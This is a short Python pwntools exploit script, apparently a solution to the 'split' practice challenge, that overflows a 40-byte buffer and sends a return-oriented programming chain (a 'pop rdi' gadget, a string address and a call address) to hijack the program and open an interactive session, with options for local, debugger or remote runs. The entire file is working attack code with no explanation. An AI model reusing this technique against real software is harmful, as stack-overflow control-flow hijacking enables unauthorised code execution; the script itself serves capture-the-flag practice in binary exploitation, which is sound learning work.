from pwn import *

elf = context.binary = ELF('./split')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b pwnme
    c
    ''')
else:
    conn = elf.process()

conn.recvuntil(b"> ")
a = b"a"*40



pop_rdi = p64(0x4007c3)
flag = p64(0x601060)
ret = p64(0x40074B)

conn.sendline(a + pop_rdi + flag + ret)

conn.interactive()